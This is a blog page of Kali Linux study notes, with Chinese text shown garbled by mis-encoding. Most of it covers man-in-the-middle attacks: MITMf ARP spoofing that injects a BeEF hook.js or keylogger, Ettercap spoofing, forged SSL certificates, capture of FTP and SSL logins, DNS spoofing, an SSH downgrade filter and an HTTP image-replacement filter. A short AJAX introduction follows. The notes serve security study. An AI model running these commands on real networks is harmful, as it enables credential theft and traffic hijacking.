    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%85%AB)%EF%BC%9ASSL%E3%80%81TLS%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB--%E6%B3%A8%E5%85%A5XSS/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%85%AB)%EF%BC%9ASSL%E3%80%81TLS%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB--%E6%B3%A8%E5%85%A5XSS/" itemprop="url">Kali Linuxç¬”è®°(äº”åå…«)ï¼šSSLã€TLSä¸­é—´äººæ”»å‡»--æ³¨å…¥XSS</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2020-01-24T15:08:48+08:00">
                2020-01-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-ä¸­é—´äººæ”»å‡»ï¼ˆæ³¨å…¥XSSï¼‰"><a href="#1-ä¸­é—´äººæ”»å‡»ï¼ˆæ³¨å…¥XSSï¼‰" class="headerlink" title="1. ä¸­é—´äººæ”»å‡»ï¼ˆæ³¨å…¥XSSï¼‰"></a>1. ä¸­é—´äººæ”»å‡»ï¼ˆæ³¨å…¥XSSï¼‰</h4><ul>
<li>æ³¨å…¥XSS<ul>
<li>ç»“åˆARPæ¬ºéª—æˆ–DNSä»£ç†æ¬ºéª—ï¼Œå®ç°ä¸­é—´äººæ”»å‡»</li>
<li>å³ä½¿æ²¡æœ‰XSSæ¼æ´ï¼Œä¹Ÿå¯ä»¥å‡Œç©ºå‘æ¯ä¸ªHTTPè¯·æ±‚ä¸­æ³¨å…¥XSSæ”»å‡»ä»£ç  </li>
<li>ä¸€æ—¦å¾—æ‰‹ï¼Œå½±å“èŒƒå›´å·¨å¤§ </li>
<li>å¦‚æœä¸­é—´äººå‘ç”Ÿåœ¨è¿è¥å•†çº¿è·¯ä¸Šï¼Œå¾ˆéš¾å¼•èµ·ç”¨æˆ·æ³¨æ„ï¼Œéšè”½æ€§é«˜ </li>
</ul>
</li>
</ul>
<h4 id="2-ä¸­é—´äººæ”»å‡»â€“Mitmf-Beef"><a href="#2-ä¸­é—´äººæ”»å‡»â€“Mitmf-Beef" class="headerlink" title="2. ä¸­é—´äººæ”»å‡»â€“Mitmf*Beef"></a>2. ä¸­é—´äººæ”»å‡»â€“Mitmf*Beef</h4><ul>
<li>Mitmf å®‰è£…ï¼ˆæ— æ ¸å¿ƒæŠ€æœ¯å†…å®¹ï¼Œå†—æ‚æ€§å¤§ï¼‰â–² 2020.1.24ä¸€äº›ä¾èµ–åŒ…ä»¥åŠå®‰è£…åŒ…æ— æ³•æ‰¾åˆ°<ul>
<li>æ›¾ç»å·ç§°æœ€å¥½ç”¨çš„ä¸­é—´äººæ”»å‡»å·¥å…·ï¼ˆkali 2.0åé»˜è®¤æœªå®‰è£…ï¼‰ </li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šapt-get install python-dev python-setuptools libpcap0.8-dev libnetfilterqueue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</code></strong> </li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šapt-get install mitmf</code></strong> </li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼špip uninstall twisted</code></strong> </li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šwget http://twistedmatrix.com/Releases/Twisted/15.5/Twisted15.5.0.tar.bz2</code></strong> </li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼špip install ./Twisted-15.5.0.tar.bz2</code></strong></li>
</ul>
</li>
<li>å¯åŠ¨beef <ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šcd /usr/share/beef-xss/</code></strong> </li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./beef</code></strong> â–² 2020.1.24ä¿®æ”¹ä¸ºbeef-xssï¼ˆå‘½ä»¤å­˜åœ¨Bashä¸­ï¼‰</li>
</ul>
</li>
<li>mitmfä¸­é—´äººæ³¨å…¥xssè„šæœ¬ï¼ˆç»“åˆBeefï¼‰<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šmitmf --spoof --arp -i eth0 --gateway 1.1.1.1ï¼ˆæ­£ç¡®ç½‘å…³åœ°å€ï¼‰ --target 1.1.1.2 --inject --js-url http://1.1.1.3:3000/hook.js</code></strong> ï¼ˆARPåœ°å€æ¬ºéª—ï¼‰</li>
</ul>
</li>
<li>mitmfä¸­é—´äººæ³¨å…¥xssè„šæœ¬ï¼ˆä¸ç»“åˆBeefï¼‰ <ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šmitmf --spoof --arp -i eth0 --gateway 192.168.20.2 --target 192.168.20.1 --jskeylogger</code></strong>ï¼ˆARPåœ°å€æ¬ºéª—ï¼‰</li>
<li>â€“upsidedownternetï¼ˆå›¾ç‰‡å€’è½¬ï¼‰ã€â€“screenï¼ˆ/var/log/mitmfï¼Œå±å¹•å¿«ç…§ï¼‰ </li>
<li>â€“ferretngï¼ˆæŠ“å–cookieï¼‰ã€â€“browserprofilerï¼ˆæµè§ˆå™¨åŠæ’ä»¶ä¿¡æ¯ï¼‰ </li>
<li>â€“smbtrapï¼ˆæŠ“å–smbï¼‰ã€â€“smbauthï¼ˆsmbè®¤è¯ï¼‰</li>
<li>â€“hstsï¼ˆæ–°çš„å®‰å…¨åè®®ï¼‰<ul>
<li>HTTP Strict Transport Security </li>
<li>é˜²æ­¢åè®®é™çº§ã€cookieçªƒå– </li>
<li>å®‰å…¨ç­–ç•¥é€šè¿‡HTTPå“åº”å¤´â€Strict-Transport-Securityâ€å®æ–½ </li>
<li>é™åˆ¶user-agentã€httpsç­‰</li>
</ul>
</li>
<li>â€“filepwnï¼ˆEXEæ‰§è¡Œç¨‹åºçš„ä¸‹è½½ï¼Œæ’å…¥åé—¨ç¨‹åºï¼‰<ul>
<li>å‡Œç©ºæ’åé—¨ </li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="3-ä¸­é—´äººæ”»å‡»â€“Ettercap"><a href="#3-ä¸­é—´äººæ”»å‡»â€“Ettercap" class="headerlink" title="3. ä¸­é—´äººæ”»å‡»â€“Ettercap"></a>3. ä¸­é—´äººæ”»å‡»â€“Ettercap</h4><ul>
<li>Ettercap â–² 2020.1.24Ettercapæœ‰ç‚¹å°é—®é¢˜ï¼Œå…³äºä¸»æœºå‘ç°è¿™ä¸€æ¨¡å—<ul>
<li>ç»Ÿä¸€çš„ä¸­é—´äººæ”»å‡»å·¥å…· </li>
<li>è½¬å‘MACä¸æœ¬æœºç›¸åŒï¼Œä½†IPä¸æœ¬æœºä¸åŒçš„æ•°æ®åŒ… </li>
<li>æ”¯æŒSSH1ã€SSLä¸­é—´äººæ”»å‡»</li>
</ul>
</li>
<li>æ¨¡å—åˆ’åˆ† <ul>
<li>Snifer </li>
<li>MITM </li>
<li>Filter </li>
<li>Log </li>
<li>Plugin</li>
</ul>
</li>
</ul>
<h4 id="4-Ettercapâ€“Snifer"><a href="#4-Ettercapâ€“Snifer" class="headerlink" title="4. Ettercapâ€“Snifer"></a>4. Ettercapâ€“Snifer</h4><ul>
<li>Snifer<ul>
<li>è´Ÿè´£æ•°æ®åŒ…è½¬å‘</li>
<li>Unified<ul>
<li>å•ç½‘å¡æƒ…å†µä¸‹ç‹¬ç«‹å®Œæˆä¸‰å±‚åŒ…è½¬å‘</li>
<li>å§‹ç»ˆç¦ç”¨å†…æ ¸IP_ForwardåŠŸèƒ½</li>
</ul>
</li>
<li>Bridge <ul>
<li>åŒç½‘å¡æƒ…å†µä¸‹çš„ä¸€å±‚MITMæ¨¡å¼</li>
<li>å¯ä½œä¸ºIPSè¿‡æ»¤æ•°æ®åŒ…</li>
<li>ä¸å¯åœ¨ç½‘å…³ä¸Šä½¿ç”¨ï¼ˆé€æ˜ç½‘æ¡¥ï¼‰</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="5-Ettercapâ€“MITM"><a href="#5-Ettercapâ€“MITM" class="headerlink" title="5. Ettercapâ€“MITM"></a>5. Ettercapâ€“MITM</h4><ul>
<li>MITM <ul>
<li>æŠŠæµé‡é‡å®šå‘åˆ°ettercapä¸»æœºä¸Š </li>
<li>å¯ä»¥ä½¿ç”¨å…¶ä»–å·¥å…·å®ç°MITMï¼Œettercapä¹‹ä½œå—…æ¢å’Œè¿‡æ»¤ä½¿ç”¨</li>
</ul>
</li>
<li>å®ç°MITMçš„æ–¹æ³• <ul>
<li>ARPï¼ˆä¸€èˆ¬ä¸ºåŠ¨æ€ç±»å‹çš„ARPè¡¨ï¼‰</li>
<li>ICMP <ul>
<li>ICMPè·¯ç”±é‡å®šå‘ï¼ŒåŠåŒå·¥ï¼Œå›åŒ…ä¸ç»è¿‡Kaliï¼ˆå»åŒ…å›åŒ…éƒ½ç»è¿‡Kaliä¸ºå…¨åŒå·¥ï¼‰</li>
<li>-M icmp:00:11:22:33:44:55/10.0.0.1ï¼ˆçœŸå®ç½‘å…³çš„MAC/IPï¼‰</li>
</ul>
</li>
<li>DHCP <ul>
<li>ä¿®æ”¹ç½‘å…³åœ°å€ï¼ŒåŠåŒå·¥ï¼Œå›åŒ…ä¸ç»è¿‡Kali</li>
<li>DHCPå‘åŒ…è¿‡ç¨‹Discoverã€Offerã€Resquestã€ACK</li>
<li>âˆ’M dhcp:192.168.0.30,35,50âˆ’60/255.255.255.0/192.168.0.1ï¼ˆDNSï¼‰</li>
</ul>
</li>
<li>Switch Port Stealingï¼ˆäº¤æ¢æœºç«¯å£çªƒå–ï¼‰<ul>
<li>äº¤æ¢æœºæ ¹æ®æºMACåœ°å€æ›´æ–°</li>
<li>floodç›®æ ‡åœ°å€æ˜¯æœ¬æœºï¼Œæºåœ°å€æ˜¯å—å®³è€…çš„åŒ…ï¼ˆå‘äº¤æ¢æœºå‘é€å¤§é‡æ³›æ´ªæ”»å‡»ï¼‰</li>
<li>é€‚ç”¨äºARPé™æ€ç»‘å®šçš„ç¯å¢ƒï¼ˆarp -s â†’ æ·»åŠ é™æ€ç»‘å®šçš„ARPï¼‰</li>
<li>-M port /1.1.1.1/ /1.1.1.2/ </li>
</ul>
</li>
<li>NDP <ul>
<li>IPv6åè®®æ¬ºéª—æŠ€æœ¯</li>
<li>-M ndp //fe80::260d:afff:fe6e:f378/ //2001:db8::2:1/</li>
</ul>
</li>
</ul>
</li>
<li>Linux2.4ä»¥ä¸Šå†…æ ¸å¯¹ARPåœ°å€æ¬ºéª—çš„çº¦æŸ <ul>
<li>æ”¶åˆ°éè¯·æ±‚çš„ARPå“åº”åŒ…ï¼Œä¸æ›´æ–°æœ¬åœ°ARPç¼“å­˜ </li>
<li>Ettercapä½¿ç”¨ARP requeståŒ…è¿›è¡Œæ”»å‡» </li>
</ul>
</li>
<li>Solarisä¸æ ¹æ®ARPåŒ…æ›´æ–°æœ¬åœ°ARPç¼“å­˜ <ul>
<li>Ettercapä½¿ç”¨å…ˆå‘ICMPåŒ…æ¥æ›´æ–°ARPç¼“å­˜</li>
</ul>
</li>
</ul>
<h4 id="6-Ettercapâ€“å‡†å¤‡"><a href="#6-Ettercapâ€“å‡†å¤‡" class="headerlink" title="6. Ettercapâ€“å‡†å¤‡"></a>6. Ettercapâ€“å‡†å¤‡</h4><ul>
<li>ç”¨æˆ·æ“ä½œç•Œé¢ <ul>
<li>-T æ–‡æœ¬ç•Œé¢ï¼ˆæ–‡æœ¬å­—ç¬¦ï¼‰</li>
<li>-G å›¾å½¢ç•Œé¢ </li>
<li>-C åŸºäºæ–‡æœ¬çš„å›¾å½¢ç•Œé¢ï¼ˆæ–‡æœ¬ç±»ä¼¼å›¾å½¢åŒ–ï¼‰</li>
<li>-D åå°æ¨¡å¼ </li>
</ul>
</li>
<li>æŒ‡å®šç›®æ ‡ <ul>
<li>IPv4ï¼šMAC/IPv4/Ports </li>
<li>IPv6ï¼šMAC/IPv4/IPv6/Ports </li>
<li>/10.0.0.1âˆ’5;10.0.1.33/20âˆ’25,80,110</li>
</ul>
</li>
<li>æƒé™ <ul>
<li>ä¸»é…ç½®æ–‡ä»¶ï¼š/etc/ettercap/etter.conf</li>
<li>éœ€è¦rootæƒé™æ‰“å¼€é“¾è·¯å±‚Socketè¿æ¥ï¼Œç„¶åä½¿ç”¨nobodyè´¦å·è¿è¡Œ </li>
<li>æ—¥å¿—å†™å…¥ç›®å½•éœ€è¦nobodyæœ‰å†™å…¥æƒ </li>
<li>ä¿®æ”¹etter.confï¼šEC_UID=65534/EC_GID=65534 â†’ EC_UID=0/EC_GID=0</li>
</ul>
</li>
<li>åŸºäºä¼ªé€ è¯ä¹¦çš„SSL MITIM <ul>
<li>Bridgeæ¨¡å¼ä¸æ”¯æŒSSL MITM â–² 2020.1.24æŠ¥é¢å¤–å‚æ•°çš„é”™è¯¯</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šopenssl genrsa âˆ’out etter.ssl.crt 1024</code></strong> </li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šopenssl req âˆ’newâˆ’keyetter.ssl.crt âˆ’out tmp.csr</code></strong> </li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šopenssl x509 âˆ’req âˆ’days 1825 âˆ’in tmp.csr âˆ’signkey etter.ssl.crt âˆ’out tmp.new</code></strong> </li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šcat tmp.new&gt;&gt;etter.ssl.crt</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šrm âˆ’f tmp.newtmp.csr</code></strong></li>
</ul>
</li>
</ul>
<h4 id="7-Ettercapâ€“å­—ç¬¦æ¨¡å¼"><a href="#7-Ettercapâ€“å­—ç¬¦æ¨¡å¼" class="headerlink" title="7. Ettercapâ€“å­—ç¬¦æ¨¡å¼"></a>7. Ettercapâ€“å­—ç¬¦æ¨¡å¼</h4><ul>
<li>å‚æ•°<ul>
<li>-Mï¼ˆMITMæŠ€æœ¯ï¼‰</li>
<li>-Fï¼ˆè¿‡æ»¤å™¨ï¼‰</li>
<li>-Pï¼ˆæ¨¡å—ï¼‰</li>
<li>-wï¼ˆç½‘ç»œæµé‡è®°å½•ï¼‰</li>
<li>-lï¼ˆç®€å•è®°å½•æ—¥å¿—ï¼‰</li>
<li>-Lï¼ˆè®°å½•æ‰€æœ‰æ—¥å¿—ä¿¡æ¯ï¼‰</li>
<li>-mï¼ˆè´¦å·å¯†ç ä¿¡æ¯ï¼‰</li>
<li>-qï¼ˆå®‰é™æ¨¡å¼/æœ‰ç”¨çš„ä¿¡æ¯ï¼‰</li>
</ul>
</li>
<li>MITMæ”»å‡»<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -F 1.ef -P autoadd -w a.cap -l loginfo -L logall -m message</code></strong></li>
<li>æ‰¾ä¸€ä¸ªFTPæœåŠ¡å™¨</li>
<li>è¾“å…¥è´¦å·/å¯†ç </li>
<li>æŸ¥çœ‹ettercapå­—ç¬¦ç•Œé¢</li>
</ul>
</li>
<li>Ettercap æ—¥å¿—æŸ¥çœ‹ â–² 2020.1.24æŸ¥çœ‹æ— æƒé™<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šcat message</code></strong>ï¼ˆrootç›®å½•ä¸‹ï¼‰</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šls logå‘ç°æ–‡ä»¶æ˜¯åŠ å¯†ä¿¡æ¯</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šetterlog -p log.eci æŸ¥çœ‹è·å–çš„å¯†ç </code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šetterlog -c log.ecp åˆ—å‡ºLogä¸­çš„è¿æ¥</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šetterlog -c -f //1.1.1.1/ log.ecp</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šetterlog -B -n -s -F TCP:1.1.1.1:20;1.1.1.2:1234 log.ecp &gt; aa é€‰æ‹©ç›¸åº”çš„è¿æ¥å¹¶æ¦¨å–æ–‡ä»¶</code></strong></li>
</ul>
</li>
</ul>
<h4 id="8-Ettercapâ€“å›¾å½¢ç•Œé¢"><a href="#8-Ettercapâ€“å›¾å½¢ç•Œé¢" class="headerlink" title="8. Ettercapâ€“å›¾å½¢ç•Œé¢"></a>8. Ettercapâ€“å›¾å½¢ç•Œé¢</h4><ul>
<li>Sniff â†’ Unified/Bridge sniffing â†’ ç½‘å¡</li>
<li>Host â†’ Scan for hostsï¼ˆä¸»æœºæ‰«æï¼Œä¼šç”Ÿæˆä¸€ä¸ªä¸»æœºåˆ—è¡¨ï¼‰</li>
<li>é€‰æ‹©ç›®æ ‡ â†’ Add to target1 / é€‰æ‹©ç›®æ ‡ â†’ Add to target2</li>
<li>Mitm â†’ ARP â†’ Sniff remote connectionsï¼ˆARPåŒå‘ä¸­é—´äººï¼ŒSingleä¸ºåŠåŒå·¥ï¼‰</li>
<li>Start â†’ Start sniffing</li>
<li>æ‰¾ä¸€ä¸ªFTPæœåŠ¡å™¨</li>
<li>è¾“å…¥è´¦å·/å¯†ç </li>
<li>æŸ¥çœ‹ettercapå›¾å½¢ç•Œé¢</li>
</ul>
<h4 id="9-Ettercapâ€“SSLä¸­é—´äººæ”»å‡»"><a href="#9-Ettercapâ€“SSLä¸­é—´äººæ”»å‡»" class="headerlink" title="9. Ettercapâ€“SSLä¸­é—´äººæ”»å‡»"></a>9. Ettercapâ€“SSLä¸­é—´äººæ”»å‡»</h4><ul>
<li>SSL MITMï¼ˆé»˜è®¤æ— å¼€å¯ï¼Œéœ€è¦åœ¨é…ç½®æ–‡ä»¶ä¸­ä¿®æ”¹ï¼Œå›¾å½¢ç•Œé¢ï¼‰<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼švi /etc/ettercap/etter.conf</code></strong>ï¼ˆLinux â†’ The second iptablesï¼‰</li>
<li>Sniff â†’ Unified/Bridge sniffing â†’ ç½‘å¡</li>
<li>Host â†’ Scan for hostsï¼ˆä¸»æœºæ‰«æï¼Œä¼šç”Ÿæˆä¸€ä¸ªä¸»æœºåˆ—è¡¨ï¼‰</li>
<li>é€‰æ‹©ç›®æ ‡ â†’ Add to target1 / é€‰æ‹©ç›®æ ‡ â†’ Add to target2</li>
<li>Mitm â†’ ARP â†’ Sniff remote connectionsï¼ˆARPåŒå‘ä¸­é—´äººï¼ŒSingleä¸ºåŠåŒå·¥ï¼‰</li>
<li>Start â†’ Start sniffing</li>
<li>æ‰¾ä¸€ä¸ªæœ‰SSLé¡µé¢</li>
<li>è¾“å…¥è´¦å·/å¯†ç </li>
<li>æŸ¥çœ‹ettercapå›¾å½¢ç•Œé¢</li>
</ul>
</li>
</ul>
<h4 id="10-Ettercapâ€“DNSæ¬ºéª—"><a href="#10-Ettercapâ€“DNSæ¬ºéª—" class="headerlink" title="10. Ettercapâ€“DNSæ¬ºéª—"></a>10. Ettercapâ€“DNSæ¬ºéª—</h4><ul>
<li>DNSæ¬ºéª—ï¼ˆå›¾å½¢ç•Œé¢ï¼‰ <ul>
<li>dns_spoofæ’ä»¶é…ç½®æ–‡ä»¶ </li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼švi /etc/ettercap/etter.dns</code></strong>ï¼ˆä¿®æ”¹æ¬ºéª—çš„åŸŸåå¯¹åº”çš„IPåœ°å€ï¼‰</li>
<li>Plugins â†’ Load a plugins â†’ Load ec_dns_spoof.so</li>
<li>Plugins â†’ Manage the plugins â†’ åŒå‡»dns_spoofå¯åŠ¨</li>
<li>Sniff â†’ Unified/Bridge sniffing â†’ ç½‘å¡</li>
<li>Host â†’ Scan for hostsï¼ˆä¸»æœºæ‰«æï¼Œä¼šç”Ÿæˆä¸€ä¸ªä¸»æœºåˆ—è¡¨ï¼‰</li>
<li>é€‰æ‹©ç›®æ ‡ â†’ Add to target1 / é€‰æ‹©ç›®æ ‡ â†’ Add to target2</li>
<li>Mitm â†’ ARP â†’ Sniff remote connectionsï¼ˆARPåŒå‘ä¸­é—´äººï¼ŒSingleä¸ºåŠåŒå·¥ï¼‰</li>
<li>Start â†’ Start sniffing</li>
<li>æ‰¾ä¸€ä¸ªæœ‰SSLé¡µé¢</li>
<li>è¾“å…¥è´¦å·/å¯†ç </li>
<li>æŸ¥çœ‹ettercapå›¾å½¢ç•Œé¢</li>
</ul>
</li>
<li>DNSæ¬ºéª—ï¼ˆå­—ç¬¦ç•Œé¢ï¼‰<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -P dns_spoof</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šipconfig /flushdns</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šping æ¬ºéª—çš„åŸŸå</code></strong></li>
</ul>
</li>
</ul>
<h4 id="11-Ettercapâ€“Filter"><a href="#11-Ettercapâ€“Filter" class="headerlink" title="11. Ettercapâ€“Filter"></a>11. Ettercapâ€“Filter</h4><ul>
<li>Filter <ul>
<li>/usr/share/ettercap/</li>
<li>â–² SSH-2.xx / SSH-1.99ï¼ˆæ—¢æ”¯æŒSSH-1ï¼Œä¹Ÿæ”¯æŒSSH-2ï¼‰ / SSH-1.51</li>
<li>etter.filter.sshï¼ˆsshè¿‡æ»¤æ–‡ä»¶ï¼ŒæŠŠSSH-2.xx/SSH-1.99è½¬å˜ä¸ºSSH-1.51ï¼‰</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šetterfilter etter.filter.ssh -o ssh.ef</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šmv ssh.ef /root</code></strong></li>
<li>ç›´æ¥è°ƒç”¨ -F ssh.efï¼ˆè‹¥å‘é€SSH-1.99ï¼Œåˆ™é™çº§SSH-1.99ä¸ºSSH-1.51ï¼‰</li>
</ul>
</li>
<li>æ›¿æ¢HTTPå†…å®¹ï¼ˆå›¾ç‰‡çš„å†…å®¹å¯ä»¥æ›¿æ¢ä¸ºä¸€ä¸ªEXEæˆ–è€…è„šæœ¬æ–‡ä»¶ï¼‰</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (ip.proto == TCP &amp;&amp; tcp.src == 80) &#123; </span><br><span class="line">     msg(&quot;data on TCP 80\n&quot;); </span><br><span class="line">         replace(&quot;img src=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); replace(&quot;IMG src=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); replace(&quot;IMG SRC=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); </span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%83)%EF%BC%9AAJAX%E3%80%81Web%20Server/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%83)%EF%BC%9AAJAX%E3%80%81Web%20Server/" itemprop="url">Kali Linuxç¬”è®°(äº”åä¸ƒ)ï¼šAJAXã€Web Server</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2020-01-24T08:34:39+08:00">
                2020-01-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-AJAX"><a href="#1-AJAX" class="headerlink" title="1. AJAX"></a>1. AJAX</h4><ul>
<li>Asynchronous JavaScript and XML</li>
<li>æ˜¯ä¸€ä¸ªæ¦‚å¿µï¼Œè€Œéä¸€ç§æ–°çš„ç¼–ç¨‹è¯­è¨€ï¼Œæ˜¯ä¸€ç»„ç°æœ‰æŠ€æœ¯çš„ç»„åˆ</li>
<li>é€šè¿‡å®¢æˆ·ç«¯è„šæœ¬åŠ¨æ€æ›´æ–°é¡µé¢éƒ¨åˆ†å†…å®¹ï¼Œè€Œéæ•´ä¸ªé¡µé¢</li>
<li>é™ä½å¸¦å®½ä½¿ç”¨ï¼Œæé«˜é€Ÿåº¦</li>
<li>æå‡ç”¨æˆ·ä½“éªŒ</li>
<li>åå°å¼‚æ­¥è®¿é—®</li>
</ul>
<h4 id="2-AJAXã€DHTMLã€DOM"><a href="#2-AJAXã€DHTMLã€DOM" class="headerlink" title="2. AJAXã€DHTMLã€DOM"></a>2. AJAXã€DHTMLã€DOM</h4><ul>
<li>AJAXç»„ä»¶<ul>
<li>JavaScriptï¼šajaxçš„æ ¸å¿ƒç»„ä»¶ï¼Œä½¿ç”¨XMLHTTPRequestå¯¹è±¡æ¥å£å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚ï¼Œæ¥æ”¶å¹¶å¤„ç†æœåŠ¡å™¨å“åº”æ•°æ®</li>
</ul>
</li>
<li>Dynamic HTMLï¼ˆDHTMLï¼‰<ul>
<li>æ—©äºAJAXå‡ºç°ï¼Œé€šè¿‡javascriptã€CSSç­‰åœ¨å®¢æˆ·ç«¯ä¿®æ”¹HTMLé¡µé¢elementï¼Œç¼ºç‚¹æ˜¯å®Œå…¨ä¾èµ–å®¢æˆ·ç«¯ä»£ç ä¿®æ”¹é¡µé¢ï¼Œä¸æœåŠ¡å™¨çš„äº¤äº’ç”±javascript appletså®Œæˆï¼ŒAJAXçš„XHRå¼¥è¡¥äº†ä»–çš„ç¼ºç‚¹ï¼ˆæ³¨å†Œç”¨æˆ·ï¼‰</li>
</ul>
</li>
<li>Document Object Modelï¼ˆDOMï¼‰<ul>
<li>å¤„ç†htmlã€xmlæ–‡æ¡£å¯¹è±¡çš„æ¡†æ¶ï¼ŒDHTMLæ˜¯ä¸€ä¸ªæµè§ˆå™¨ï¼ŒDOMä½œä¸ºå…¶ä¸€ä¸ªå®ç°çš„æ¥å£ï¼Œå®šä¹‰å’Œç®¡ç†æ¯ä¸ªé¡µé¢å…ƒç´ objçš„Propertiesã€methodã€event</li>
</ul>
</li>
</ul>
<h4 id="3-åŸºäºAJAXçš„WEBåº”ç”¨å·¥ä½œæµç¨‹"><a href="#3-åŸºäºAJAXçš„WEBåº”ç”¨å·¥ä½œæµç¨‹" class="headerlink" title="3. åŸºäºAJAXçš„WEBåº”ç”¨å·¥ä½œæµç¨‹"></a>3. åŸºäºAJAXçš„WEBåº”ç”¨å·¥ä½œæµç¨‹</h4><ul>
<li>XMLHTTPRequest APIåˆ›å»ºå¯¹è±¡xmlhttpè¿›è¡Œè®¿é—®</li>
<li>Xmlã€jsonï¼ˆé»˜è®¤é¦–é€‰ï¼‰ã€htmlã€æ–‡æœ¬ã€å›¾ç‰‡</li>
